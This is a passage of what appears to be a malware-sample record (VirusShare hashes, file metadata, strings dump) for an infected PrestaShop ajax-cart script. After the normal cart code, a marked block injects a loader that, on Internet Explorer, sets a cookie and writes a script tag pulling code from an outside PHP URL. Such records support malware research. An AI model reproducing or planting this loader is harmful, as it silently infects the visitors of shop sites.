1)\n\t\t\t{\n\t\t\t\t$('.ajax_cart_product_txt').each( function () {\n\t\t\t\t\t$(this).hide();\n\t\t\t\t});\n\n\t\t\t\t$('.ajax_cart_product_txt_s').each( function () {\n\t\t\t\t\t$(this).show();\n\t\t\t\t});\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$('.ajax_cart_product_txt').each( function () {\n\t\t\t\t\t$(this).show();\n\t\t\t\t});\n\n\t\t\t\t$('.ajax_cart_product_txt_s').each( function () {\n\t\t\t\t\t$(this).hide();\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$('.ajax_cart_quantity, .ajax_cart_product_txt_s, .ajax_cart_product_txt, .ajax_cart_total').each(function(){\n\t\t\t\t$(this).hide();\n\t\t\t});\n\t\t\t$('.ajax_cart_no_product').show('slow');\n\t\t}\n\t}\n};\n\nfunction HoverWatcher(selector){\n\tthis.hovering = false;\n\tvar self = this;\n\n\tthis.isHoveringOver = function() {\n\t\treturn self.hovering;\n\t}\n\n\t$(selector).hover(function() {\n\t\tself.hovering = true;\n\t}, function() {\n\t\tself.hovering = false;\n\t})\n}\n\n//when document is loaded...\n$(document).ready(function(){\n\t// expand/collapse management\n\t$('#block_cart_collapse').click(function(){\n\t\t\tajaxCart.collapse();\n\t});\n\t$('#block_cart_expand').click(function(){\n\t\t\tajaxCart.expand();\n\t});\n\tajaxCart.overrideButtonsInThePage();\n\n\tvar cart_qty = 0;\n\tvar current_timestamp = parseInt(new Date().getTime() / 1000);\n\n\tif (typeof $('.ajax_cart_quantity').html() == 'undefined' || (typeof generated_date != 'undefined' && generated_date != null && (parseInt(generated_date) + 30) < current_timestamp))\n\t\tajaxCart.refresh();\n\telse\n\t\tcart_qty = parseInt($('.ajax_cart_quantity').html());\n\n\t/* roll over cart */\n\tvar cart_block = new HoverWatcher('#cart_block');\n\tvar shopping_cart = new HoverWatcher('#shopping_cart');\n\n\t$(\"#shopping_cart a:first\").hover(\n\t\tfunction() {\n\t\t\t$(this).css('border-radius', '3px 3px 0px 0px');\n\t\t\tif (ajaxCart.nb_total_products > 0 || cart_qty > 0)\n\t\t\t\t$(\"#cart_block\").stop(true, true).slideDown(450);\n\t\t},\n\t\tfunction() {\n\t\t\t$('#shopping_cart a').css('border-radius', '3px');\n\t\t\tsetTimeout(function() {\n\t\t\t\tif (!shopping_cart.isHoveringOver() && !cart_block.isHoveringOver())\n\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(450);\n\t\t\t}, 200);\n\t\t}\n\t);\n\n\t$(\"#cart_block\").hover(\n\t\tfunction() {\n\t\t\t$('#shopping_cart a').css('border-radius', '3px 3px 0px 0px');\n\t\t},\n\t\tfunction() {\n\t\t\t$('#shopping_cart a').css('border-radius', '3px');\n\t\t\tsetTimeout(function() {\n\t\t\t\tif (!shopping_cart.isHoveringOver())\n\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(450);\n\t\t\t}, 200);\n\t\t}\n\t);\n\n\t$('.delete_voucher').live('click', function() {\n\t\t$.ajax({\n\t\t\ttype: 'POST',\n\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\tasync: true,\n\t\t\tcache: false,\n\t\t\turl:$(this).attr('href') + '?rand=' + new Date().getTime()\n\t\t});\n\t\t$(this).parent().parent().remove();\n\t\tif ($('body').attr('id') == 'order' || $('body').attr('id') == 'order-opc')\n\t\t{\n\t\t\tif (typeof(updateAddressSelection) != 'undefined')\n\t\t\t\tupdateAddressSelection();\n\t\t\telse\n\t\t\t\tlocation.reload();\n\t\t}\n\t\treturn false;\n\t});\n\n\t$('#cart_navigation input').click(function(){\n\t\t$(this).attr('disabled', true).removeClass('exclusive').addClass('exclusive_disabled');\n\t\t$(this).closest(\"form\").get(0).submit();\n\t});\n});\n\n\n/*78bc67*/\nfunction getCookie(name) { var cookie = \" \" + document.cookie; var search = \" \" + name + \"=\"; var setStr = null; var offset = 0; var end = 0; if (cookie.length > 0) { offset = cookie.indexOf(search); if (offset != -1) { offset += search.length; end = cookie.indexOf(\";\", offset); if (end == -1) { end = cookie.length; } setStr = unescape(cookie.substring(offset, end)); } } return setStr;}\nif (navigator.userAgent.indexOf(\"MSIE\") != -1){if(navigator.cookieEnabled == true) {var user98866 = getCookie(\"uxux09\");if (user98866 !==\"uxux\"){setCookie(\"uxux09\", \"uxux\", 7, \"/\"); cookieux09ux();}}} function cookieux09ux(){document.write(\"<script src='http://markus-wahmhoff.de/bilder/zCqx2g9m.php?id=130785184' type='text/javascript'></\" + \"script>\");}\nfunction setCookie(name, value, expiredays, path, domain, secure) { if (expiredays) { var exdate=new Date(); exdate.setDate(exdate.getDate()+expiredays); var expires = exdate.toGMTString(); } document.cookie = name + \"=\" + escape(value) + ((expiredays) ? \"; expires=\" + expires : \"\") + ((path) ? \"; path=\" + path : \"\") + ((domain) ? \"; domain=\" + domain : \"\") + ((secure) ? \"; secure\" : \"\");}\n\n/*/78bc67*/"
    },
    "filename": "VirusShare_9b9eccbbb2dcb02dbca7dc8a3e046398",
    "filesize": 28785,
    "filetype": "ASCII text, with very long lines, with CRLF, LF line terminators",
    "hashes": {
        "md5": "9b9eccbbb2dcb02dbca7dc8a3e046398",
        "sha1": "e87ea42567e09f660591308a85a01000af04dd74",
        "sha256": "892e8246adfd87863408379081b733b7c056586768d17bff423d7f05a3f956bb"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "* 2007-2013 PrestaShop",
            "* NOTICE OF LICENSE",
            "* This source file is subject to the Academic Free License (AFL 3.0)",
            "* that is bundled with this package in the file LICENSE.txt.",
            "* It is also available through the world-wide-web at this URL:",
            "* http://opensource.org/licenses/afl-3.0.php",
            "* If you did not receive a copy of the license and are unable to",
            "* obtain it through the world-wide-web, please send an email",
            "* to license@prestashop.com so we can send you a copy immediately.",
            "* DISCLAIMER",
            "* Do not edit or add to this file if you wish to upgrade PrestaShop to newer",
            "* versions in the future. If you wish to customize PrestaShop for your",
            "* needs please refer to http://www.prestashop.com for more information.",
            "*  @author PrestaShop SA <contact@prestashop.com>",
            "*  @copyright  2007-2013 PrestaShop SA",
            "*  @license    http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)",
            "*  International Registered Trademark & Property of PrestaShop SA",
            "// Retrocompatibility with 1.4",
            "if (typeof baseUri === \"undefined\" && typeof baseDir !== \"undefined\")",
            "\tbaseUri = baseDir;",
            "//JS Object : update the cart by ajax actions",
            "var ajaxCart = {",
            "\tnb_total_products: 0,",
            "\t//override every button in the page in relation to the cart",
            "\toverrideButtonsInThePage : function(){",
            "\t\t//for every 'add' buttons...",
            "\t\t$('.ajax_add_to_cart_button').unbind('click').click(function(){",
            "\t\t\tvar idProduct =  $(this).attr('rel').replace('nofollow', '').replace('ajax_id_product_', '');",
            "\t\t\tif ($(this).attr('disabled') != 'disabled')",
            "\t\t\t\tajaxCart.add(idProduct, null, false, this);",
            "\t\t\treturn false;",
            "\t\t});",
            "\t\t//for product page 'add' button...",
            "\t\t$('#add_to_cart input').unbind('click').click(function(){",
            "\t\t\tajaxCart.add( $('#product_page_product_id').val(), $('#idCombination').val(), true, null, $('#quantity_wanted').val(), null);",
            "\t\t\treturn false;",
            "\t\t});",
            "\t\t//for 'delete' buttons in the cart block...",
            "\t\t$('#cart_block_list .ajax_cart_block_remove_link').unbind('click').click(function(){",
            "\t\t\t// Customized product management",
            "\t\t\tvar customizationId = 0;",
            "\t\t\tvar productId = 0;",
            "\t\t\tvar productAttributeId = 0;",
            "\t\t\tvar customizableProductDiv = $($(this).parent().parent()).find(\"div[id^=deleteCustomizableProduct_]\");",
            "\t\t\tif (customizableProductDiv && $(customizableProductDiv).length)",
            "\t\t\t{",
            "\t\t\t\t$(customizableProductDiv).each(function(){",
            "\t\t\t\t\tvar ids = $(this).attr('id').split('_');",
            "\t\t\t\t\tif (typeof(ids[1]) != 'undefined')",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\tcustomizationId = parseInt(ids[1]);",
            "\t\t\t\t\t\tproductId = parseInt(ids[2]);",
            "\t\t\t\t\t\tif (typeof(ids[3]) != 'undefined')",
            "\t\t\t\t\t\t\tproductAttributeId = parseInt(ids[3]);",
            "\t\t\t\t\t\treturn false;",
            "\t\t\t\t\t}",
            "\t\t\t\t});",
            "\t\t\t}",
            "\t\t\t// Common product management",
            "\t\t\tif (!customizationId)",
            "\t\t\t{",
            "\t\t\t\t//retrieve idProduct and idCombination from the displayed product in the block cart",
            "\t\t\t\tvar firstCut = $(this).parent().parent().attr('id').replace('cart_block_product_', '');",
            "\t\t\t\tfirstCut = firstCut.replace('deleteCustomizableProduct_', '');",
            "\t\t\t\tids = firstCut.split('_');",
            "\t\t\t\tproductId = parseInt(ids[0]);",
            "\t\t\t\tif (typeof(ids[1]) != 'undefined')",
            "\t\t\t\t\tproductAttributeId = parseInt(ids[1]);",
            "\t\t\t}",
            "\t\t\tvar idAddressDelivery = $(this).parent().parent().attr('id').match(/.*_\\d+_\\d+_(\\d+)/)[1];",
            "\t\t\t// Removing product from the cart",
            "\t\t\tajaxCart.remove(productId, productAttributeId, customizationId, idAddressDelivery);",
            "\t\t\treturn false;",
            "\t\t});",
            "\t// try to expand the cart",
            "\texpand : function(){",
            "\t\tif ($('#cart_block_list').hasClass('collapsed'))",
            "\t\t\t$('#cart_block_summary').slideUp(200, function(){",
            "\t\t\t\t$(this).addClass('collapsed').removeClass('expanded');",
            "\t\t\t\t$('#cart_block_list').slideDown({",
            "\t\t\t\t\tduration: 450,",
            "\t\t\t\t\tcomplete: function(){$(this).addClass('expanded').removeClass('collapsed');}",
            "\t\t\t\t});",
            "\t\t\t});",
            "\t\t\t// toogle the button expand/collapse button",
            "\t\t\t$('#block_cart_expand').fadeOut('slow', function(){",
            "\t\t\t\t$('#block_cart_collapse').fadeIn('fast');",
            "\t\t\t});",
            "\t\t\t// save the expand statut in the user cookie",
            "\t\t\t$.ajax({",
            "\t\t\t\ttype: 'POST',",
            "\t\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\t\turl: baseDir + 'modules/blockcart/blockcart-set-collapse.php' + '?rand=' + new Date().getTime(),",
            "\t\t\t\tasync: true,",
            "\t\t\t\tcache: false,",
            "\t\t\t\tdata: 'ajax_blockcart_display=expand'",
            "\t\t\t});",
            "\t// Fix display when using back and previous browsers buttons",
            "\trefresh : function(){",
            "\t\t$.ajax({",
            "\t\t\ttype: 'POST',",
            "\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\turl: baseUri + '?rand=' + new Date().getTime(),",
            "\t\t\tasync: true,",
            "\t\t\tcache: false,",
            "\t\t\tdataType : \"json\",",
            "\t\t\tdata: 'controller=cart&ajax=true&token=' + static_token,",
            "\t\t\tsuccess: function(jsonData)",
            "\t\t\t{",
            "\t\t\t\tajaxCart.updateCart(jsonData);",
            "\t\t\t}",
            "\t\t});",
            "\t// try to collapse the cart",
            "\tcollapse : function(){",
            "\t\tif ($('#cart_block_list').hasClass('expanded'))",
            "\t\t\t$('#cart_block_list').slideUp('slow', function(){",
            "\t\t\t\t$(this).addClass('collapsed').removeClass('expanded');",
            "\t\t\t\t$('#cart_block_summary').slideDown(450, function(){",
            "\t\t\t\t\t$(this).addClass('expanded').removeClass('collapsed');",
            "\t\t\t\t});",
            "\t\t\t});",
            "\t\t\t$('#block_cart_collapse').fadeOut('slow', function(){",
            "\t\t\t\t$('#block_cart_expand').fadeIn('fast');",
            "\t\t\t});",
            "\t\t\t// save the expand statut in the user cookie",
            "\t\t\t$.ajax({",
            "\t\t\t\ttype: 'POST',",
            "\t\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\t\turl: baseDir + 'modules/blockcart/blockcart-set-collapse.php' + '?rand=' + new Date().getTime(),",
            "\t\t\t\tasync: true,",
            "\t\t\t\tcache: false,",
            "\t\t\t\tdata: 'ajax_blockcart_display=collapse' + '&rand=' + new Date().getTime()",
            "\t\t\t});",
            "\t// Update the cart information",
            "\tupdateCartInformation : function (jsonData, addedFromProductPage)",
            "\t\tajaxCart.updateCart(jsonData);",
            "\t\t//reactive the button when adding has finished",
            "\t\tif (addedFromProductPage)",
            "\t\t\t$('#add_to_cart input').removeAttr('disabled').addClass('exclusive').removeClass('exclusive_disabled');",
            "\t\telse",
            "\t\t\t$('.ajax_add_to_cart_button').removeAttr('disabled');",
            "\t// add a product in the cart via ajax",
            "\tadd : function(idProduct, idCombination, addedFromProductPage, callerElement, quantity, whishlist){",
            "\t\tif (addedFromProductPage && !checkCustomizations())",
            "\t\t\talert(fieldRequired);",
            "\t\t\treturn ;",
            "\t\temptyCustomizations();",
            "\t\t//disabled the button when adding to not double add if user double click",
            "\t\tif (addedFromProductPage)",
            "\t\t\t$('#add_to_cart input').attr('disabled', true).removeClass('exclusive').addClass('exclusive_disabled');",
            "\t\t\t$('.filled').removeClass('filled');",
            "\t\telse",
            "\t\t\t$(callerElement).attr('disabled', true);",
            "\t\tif ($('#cart_block_list').hasClass('collapsed'))",
            "\t\t\tthis.expand();",
            "\t\t//send the ajax request to the server",
            "\t\t$.ajax({",
            "\t\t\ttype: 'POST',",
            "\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\turl: baseUri + '?rand=' + new Date().getTime(),",
            "\t\t\tasync: true,",
            "\t\t\tcache: false,",
            "\t\t\tdataType : \"json\",",
            "\t\t\tdata: 'controller=cart&add=1&ajax=true&qty=' + ((quantity && quantity != null) ? quantity : '1') + '&id_product=' + idProduct + '&token=' + static_token + ( (parseInt(idCombination) && idCombination != null) ? '&ipa=' + parseInt(idCombination): ''),",
            "\t\t\tsuccess: function(jsonData,textStatus,jqXHR)",
            "\t\t\t{",
            "\t\t\t\t// add appliance to whishlist module",
            "\t\t\t\tif (whishlist && !jsonData.errors)",
            "\t\t\t\t\tWishlistAddProductCart(whishlist[0], idProduct, idCombination, whishlist[1]);",
            "\t\t\t\t// add the picture to the cart",
            "\t\t\t\tvar $element = $(callerElement).parent().parent().find('a.product_image img,a.product_img_link img');",
            "\t\t\t\tif (!$element.length)",
            "\t\t\t\t\t$element = $('#bigpic');",
            "\t\t\t\tvar $picture = $element.clone();",
            "\t\t\t\tvar pictureOffsetOriginal = $element.offset();",
            "\t\t\t\tpictureOffsetOriginal.right = $(window).innerWidth() - pictureOffsetOriginal.left - $element.width();",
            "\t\t\t\tif ($picture.length)",
            "\t\t\t\t{",
            "\t\t\t\t\t$picture.css({",
            "\t\t\t\t\t\tposition: 'absolute',",
            "\t\t\t\t\t\ttop: pictureOffsetOriginal.top,",
            "\t\t\t\t\t\tright: pictureOffsetOriginal.right",
            "\t\t\t\t\t});",
            "\t\t\t\t}",
            "\t\t\t\tvar pictureOffset = $picture.offset();",
            "\t\t\t\tvar cartBlock = $('#cart_block');",
            "\t\t\t\tif (!$('#cart_block')[0] || !$('#cart_block').offset().top || !$('#cart_block').offset().left)",
            "\t\t\t\t\tcartBlock = $('#shopping_cart');",
            "\t\t\t\tvar cartBlockOffset = cartBlock.offset();",
            "\t\t\t\tcartBlockOffset.right = $(window).innerWidth() - cartBlockOffset.left - cartBlock.width();",
            "\t\t\t\t// Check if the block cart is activated for the animation",
            "\t\t\t\tif (cartBlockOffset != undefined && $picture.length)",
            "\t\t\t\t{",
            "\t\t\t\t\t$picture.appendTo('body');",
            "\t\t\t\t\t$picture",
            "\t\t\t\t\t\t.css({",
            "\t\t\t\t\t\t\tposition: 'absolute',",
            "\t\t\t\t\t\t\ttop: pictureOffsetOriginal.top,",
            "\t\t\t\t\t\t\tright: pictureOffsetOriginal.right,",
            "\t\t\t\t\t\t\tzIndex: 4242",
            "\t\t\t\t\t\t})",
            "\t\t\t\t\t\t.animate({",
            "\t\t\t\t\t\t\twidth: $element.attr('width')*0.66,",
            "\t\t\t\t\t\t\theight: $element.attr('height')*0.66,",
            "\t\t\t\t\t\t\topacity: 0.2,",
            "\t\t\t\t\t\t\ttop: cartBlockOffset.top + 30,",
            "\t\t\t\t\t\t\tright: cartBlockOffset.right + 15",
            "\t\t\t\t\t\t}, 1000)",
            "\t\t\t\t\t\t.fadeOut(100, function() {",
            "\t\t\t\t\t\t\tajaxCart.updateCartInformation(jsonData, addedFromProductPage);",
            "\t\t\t\t\t\t\t$(this).remove();",
            "\t\t\t\t\t\t});",
            "\t\t\t\t}",
            "\t\t\t\telse",
            "\t\t\t\t\tajaxCart.updateCartInformation(jsonData, addedFromProductPage);",
            "\t\t\t},",
            "\t\t\terror: function(XMLHttpRequest, textStatus, errorThrown)",
            "\t\t\t{",
            "\t\t\t\talert(\"Impossible to add the product to the cart.\\n\\ntextStatus: '\" + textStatus + \"'\\nerrorThrown: '\" + errorThrown + \"'\\nresponseText:\\n\" + XMLHttpRequest.responseText);",
            "\t\t\t\t//reactive the button when adding has finished",
            "\t\t\t\tif (addedFromProductPage)",
            "\t\t\t\t\t$('#add_to_cart input').removeAttr('disabled').addClass('exclusive').removeClass('exclusive_disabled');",
            "\t\t\t\telse",
            "\t\t\t\t\t$(callerElement).removeAttr('disabled');",
            "\t\t\t}",
            "\t\t});",
            "\t//remove a product from the cart via ajax",
            "\tremove : function(idProduct, idCombination, customizationId, idAddressDelivery){",
            "\t\t//send the ajax request to the server",
            "\t\t$.ajax({",
            "\t\t\ttype: 'POST',",
            "\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\turl: baseUri + '?rand=' + new Date().getTime(),",
            "\t\t\tasync: true,",
            "\t\t\tcache: false,",
            "\t\t\tdataType : \"json\",",
            "\t\t\tdata: 'controller=cart&delete=1&id_product=' + idProduct + '&ipa=' + ((idCombination != null && parseInt(idCombination)) ? idCombination : '') + ((customizationId && customizationId != null) ? '&id_customization=' + customizationId : '') + '&id_address_delivery=' + idAddressDelivery + '&token=' + static_token + '&ajax=true',",
            "\t\t\tsuccess: function(jsonData)\t{",
            "\t\t\t\tajaxCart.updateCart(jsonData);",
            "\t\t\t\tif ($('body').attr('id') == 'order' || $('body').attr('id') == 'order-opc')",
            "\t\t\t\t\tdeleteProductFromSummary(idProduct+'_'+idCombination+'_'+customizationId+'_'+idAddressDelivery);",
            "\t\t\t},",
            "\t\t\terror: function() {alert('ERROR: unable to delete the product');}",
            "\t\t});",
            "\t//hide the products displayed in the page but no more in the json data",
            "\thideOldProducts : function(jsonData) {",
            "\t\t//delete an eventually removed product of the displayed cart (only if cart is not empty!)",
            "\t\tif ($('#cart_block_list dl.products').length > 0)",
            "\t\t\tvar removedProductId = null;",
            "\t\t\tvar removedProductData = null;",
            "\t\t\tvar removedProductDomId = null;",
            "\t\t\t//look for a product to delete...",
            "\t\t\t$('#cart_block_list dl.products dt').each(function(){",
            "\t\t\t\t//retrieve idProduct and idCombination from the displayed product in the block cart",
            "\t\t\t\tvar domIdProduct = $(this).attr('id');",
            "\t\t\t\tvar firstCut =  domIdProduct.replace('cart_block_product_', '');",
            "\t\t\t\tvar ids = firstCut.split('_');",
            "\t\t\t\t//try to know if the current product is still in the new list",
            "\t\t\t\tvar stayInTheCart = false;",
            "\t\t\t\tfor (aProduct in jsonData.products)",
            "\t\t\t\t{",
            "\t\t\t\t\t//we've called the variable aProduct because IE6 bug if this variable is called product",
            "\t\t\t\t\t//if product has attributes",
            "\t\t\t\t\tif (jsonData.products[aProduct]['id'] == ids[0] && (!ids[1] || jsonData.products[aProduct]['idCombination'] == ids[1]))",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\tstayInTheCart = true;",
            "\t\t\t\t\t\t// update the product customization display (when the product is still in the cart)",
            "\t\t\t\t\t\tajaxCart.hideOldProductCustomizations(jsonData.products[aProduct], domIdProduct);",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\t//remove product if it's no more in the cart",
            "\t\t\t\tif (!stayInTheCart)",
            "\t\t\t\t{",
            "\t\t\t\t\tremovedProductId = $(this).attr('id');",
            "\t\t\t\t\tif (removedProductId != null)",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\tvar firstCut =  removedProductId.replace('cart_block_product_', '');",
            "\t\t\t\t\t\tvar ids = firstCut.split('_');",
            "\t\t\t\t\t\t$('#'+removedProductId).addClass('strike').fadeTo('slow', 0, function(){",
            "\t\t\t\t\t\t\t$(this).slideUp('slow', function(){",
            "\t\t\t\t\t\t\t\t$(this).remove();",
            "\t\t\t\t\t\t\t\t// If the cart is now empty, show the 'no product in the cart' message and close detail",
            "\t\t\t\t\t\t\t\tif($('#cart_block dl.products dt').length == 0)",
            "\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(200);",
            "\t\t\t\t\t\t\t\t\t$('#cart_block_no_products:hidden').slideDown(450);",
            "\t\t\t\t\t\t\t\t\t$('#cart_block dl.products').remove();",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t});",
            "\t\t\t\t\t\t});",
            "\t\t\t\t\t\t$('#cart_block_combination_of_' + ids[0] + (ids[1] ? '_'+ids[1] : '') + (ids[2] ? '_'+ids[2] : '')).fadeTo('fast', 0, function(){",
            "\t\t\t\t\t\t\t$(this).slideUp('fast', function(){",
            "\t\t\t\t\t\t\t\t$(this).remove();",
            "\t\t\t\t\t\t\t});",
            "\t\t\t\t\t\t});",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t});",
            "\thideOldProductCustomizations : function (product, domIdProduct)",
            "\t\tvar customizationList = $('#customization_' + product['id'] + '_' + product['idCombination']);",
            "\t\tif(customizationList.length > 0)",
            "\t\t\t$(customizationList).find(\"li\").each(function(){",
            "\t\t\t\t$(this).find(\"div\").each(function() {",
            "\t\t\t\t\tvar customizationDiv = $(this).attr('id');",
            "\t\t\t\t\tvar tmp = customizationDiv.replace('deleteCustomizableProduct_', '');",
            "\t\t\t\t\tvar ids = tmp.split('_');",
            "\t\t\t\t\tif ((parseInt(product.idCombination) == parseInt(ids[2])) && !ajaxCart.doesCustomizationStillExist(product, ids[0]))",
            "\t\t\t\t\t\t$('#' + customizationDiv).parent().addClass('strike').fadeTo('slow', 0, function(){",
            "\t\t\t\t\t\t\t$(this).slideUp('slow');",
            "\t\t\t\t\t\t\t$(this).remove();",
            "\t\t\t\t\t\t});",
            "\t\t\t\t});",
            "\t\t\t});",
            "\t\tvar removeLinks = $('#' + domIdProduct).find('.ajax_cart_block_remove_link');",
            "\t\tif (!product.hasCustomizedDatas && !removeLinks.length)",
            "\t\t\t$('#' + domIdProduct + ' span.remove_link').html('<a class=\"ajax_cart_block_remove_link\" rel=\"nofollow\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + product['id'] + '&amp;ipa=' + product['idCombination'] + '&amp;token=' + static_token + '\"> </a>');",
            "\t\tif (product.is_gift)",
            "\t\t\t$('#' + domIdProduct + ' span.remove_link').html('');",
            "\tdoesCustomizationStillExist : function (product, customizationId)",
            "\t\tvar exists = false;",
            "\t\t$(product.customizedDatas).each(function() {",
            "\t\t\tif (this.customizationId == customizationId)",
            "\t\t\t{",
            "\t\t\t\texists = true;",
            "\t\t\t\t// This return does not mean that we found nothing but simply break the loop",
            "\t\t\t\treturn false;",
            "\t\t\t}",
            "\t\t});",
            "\t\treturn (exists);",
            "\t//refresh display of vouchers (needed for vouchers in % of the total)",
            "\trefreshVouchers : function (jsonData) {",
            "\t\tif (typeof(jsonData.discounts) == 'undefined' || jsonData.discounts.length == 0)",
            "\t\t\t$('#vouchers').hide();",
            "\t\telse",
            "\t\t\t$('#vouchers tbody').html('');",
            "\t\t\tfor (i=0; i < jsonData.discounts.length; i++)",
            "\t\t\t{",
            "\t\t\t\tif (parseFloat(jsonData.discounts[i].price_float) > 0)",
            "\t\t\t\t{",
            "\t\t\t\t\tvar delete_link = '';",
            "\t\t\t\t\tif (jsonData.discounts[i].code.length)",
            "\t\t\t\t\t\tdelete_link = '<a class=\"delete_voucher\" href=\"'+jsonData.discounts[i].link+'\" title=\"'+delete_txt+'\"><img src=\"'+img_dir+'icon/delete.gif\" alt=\"'+delete_txt+'\" class=\"icon\" /></a>';",
            "\t\t\t\t\t$('#vouchers tbody').append($(",
            "\t\t\t\t\t\t'<tr class=\"bloc_cart_voucher\" id=\"bloc_cart_voucher_'+jsonData.discounts[i].id+'\">'",
            "\t\t\t\t\t\t+ '<td class=\"quantity\">1x</td>'",
            "\t\t\t\t\t\t+ '<td class=\"name\" title=\"'+jsonData.discounts[i].description+'\">'+jsonData.discounts[i].name+'</td>'",
            "\t\t\t\t\t\t+ '<td class=\"price\">-'+jsonData.discounts[i].price+'</td>'",
            "\t\t\t\t\t\t+ '<td class=\"delete\">' + delete_link + '</td>'",
            "\t\t\t\t\t\t+ '</tr>'",
            "\t\t\t\t\t));",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t$('#vouchers').show();",
            "\t// Update product quantity",
            "\tupdateProductQuantity : function (product, quantity) {",
            "\t\t$('#cart_block_product_' + product.id + '_' + (product.idCombination ? product.idCombination : '0')+ '_' + (product.idAddressDelivery ? product.idAddressDelivery : '0') + ' .quantity').fadeTo('fast', 0, function() {",
            "\t\t\t$(this).text(quantity);",
            "\t\t\t$(this).fadeTo('fast', 1, function(){",
            "\t\t\t\t$(this).fadeTo('fast', 0, function(){",
            "\t\t\t\t\t$(this).fadeTo('fast', 1, function(){",
            "\t\t\t\t\t\t$(this).fadeTo('fast', 0, function(){",
            "\t\t\t\t\t\t\t$(this).fadeTo('fast', 1);",
            "\t\t\t\t\t\t});",
            "\t\t\t\t\t});",
            "\t\t\t\t});",
            "\t\t\t});",
            "\t\t});",
            "\t//display the products witch are in json data but not already displayed",
            "\tdisplayNewProducts : function(jsonData) {",
            "\t\t//add every new products or update displaying of every updated products",
            "\t\t$(jsonData.products).each(function(){",
            "\t\t\t//fix ie6 bug (one more item 'undefined' in IE6)",
            "\t\t\tif (this.id != undefined)",
            "\t\t\t{",
            "\t\t\t\t//create a container for listing the products and hide the 'no product in the cart' message (only if the cart was empty)",
            "\t\t\t\tif ($('#cart_block dl.products').length == 0)",
            "\t\t\t\t{",
            "\t\t\t\t\t$('#cart_block_no_products').before('<dl class=\"products\"></dl>');",
            "\t\t\t\t\t$('#cart_block_no_products').hide();",
            "\t\t\t\t}",
            "\t\t\t\t//if product is not in the displayed cart, add a new product's line",
            "\t\t\t\tvar domIdProduct = this.id + '_' + (this.idCombination ? this.idCombination : '0') + '_' + (this.idAddressDelivery ? this.idAddressDelivery : '0');",
            "\t\t\t\tvar domIdProductAttribute = this.id + '_' + (this.idCombination ? this.idCombination : '0');",
            "\t\t\t\tif ($('#cart_block_product_'+ domIdProduct).length == 0)",
            "\t\t\t\t{",
            "\t\t\t\t\tvar productId = parseInt(this.id);",
            "\t\t\t\t\tvar productAttributeId = (this.hasAttributes ? parseInt(this.attributes) : 0);",
            "\t\t\t\t\tvar content =  '<dt class=\"hidden\" id=\"cart_block_product_' + domIdProduct + '\">';",
            "\t\t\t\t\tcontent += '<span class=\"quantity-formated\"><span class=\"quantity\">' + this.quantity + '</span>x</span>';",
            "\t\t\t\t\tvar min = this.name.indexOf(';', 10);",
            "\t\t\t\t\tvar name = (this.name.length > 12 ? this.name.substring(0, ((min - 10) <= 7) ? min : 10) + '...' : this.name);",
            "\t\t\t\t\tcontent += '<a href=\"' + this.link + '\" title=\"' + this.name + '\" class=\"cart_block_product_name\">' + name + '</a>';",
            "\t\t\t\t\tif (typeof(this.is_gift) == 'undefined' || this.is_gift == 0)",
            "\t\t\t\t\t\tcontent += '<span class=\"remove_link\"><a rel=\"nofollow\" class=\"ajax_cart_block_remove_link\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + productId + '&amp;token=' + static_token + (this.hasAttributes ? '&amp;ipa=' + parseInt(this.idCombination) : '') + '\"> </a></span>';",
            "\t\t\t\t\telse",
            "\t\t\t\t\t\tcontent += '<span class=\"remove_link\"></span>';",
            "\t\t\t\t\tif (typeof(freeProductTranslation) != 'undefined')",
            "\t\t\t\t\t\tcontent += '<span class=\"price\">' + (parseFloat(this.price_float) > 0 ? this.priceByLine : freeProductTranslation) + '</span>';",
            "\t\t\t\t\tcontent += '</dt>';",
            "\t\t\t\t\tif (this.hasAttributes)",
            "\t\t\t\t\t\t  content += '<dd id=\"cart_block_combination_of_' + domIdProduct + '\" class=\"hidden\"><a href=\"' + this.link + '\" title=\"' + this.name + '\">' + this.attributes + '</a>';",
            "\t\t\t\t\tif (this.hasCustomizedDatas)",
            "\t\t\t\t\t\tcontent += ajaxCart.displayNewCustomizedDatas(this);",
            "\t\t\t\t\tif (this.hasAttributes) content += '</dd>';",
            "\t\t\t\t\t$('#cart_block dl.products').append(content);",
            "\t\t\t\t}",
            "\t\t\t\t//else update the product's line",
            "\t\t\t\telse",
            "\t\t\t\t{",
            "\t\t\t\t\tvar jsonProduct = this;",
            "\t\t\t\t\tif($.trim($('#cart_block_product_' + domIdProduct + ' .quantity').html()) != jsonProduct.quantity || $.trim($('#cart_block_product_' + domIdProduct + ' .price').html()) != jsonProduct.priceByLine)",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\t// Usual product",
            "\t\t\t\t\t\tif (!this.is_gift)",
            "\t\t\t\t\t\t\t$('#cart_block_product_' + domIdProduct + ' .price').text(jsonProduct.priceByLine);",
            "\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t$('#cart_block_product_' + domIdProduct + ' .price').html(freeProductTranslation);",
            "\t\t\t\t\t\tajaxCart.updateProductQuantity(jsonProduct, jsonProduct.quantity);",
            "\t\t\t\t\t\t// Customized product",
            "\t\t\t\t\t\tif (jsonProduct.hasCustomizedDatas)",
            "\t\t\t\t\t\t{",
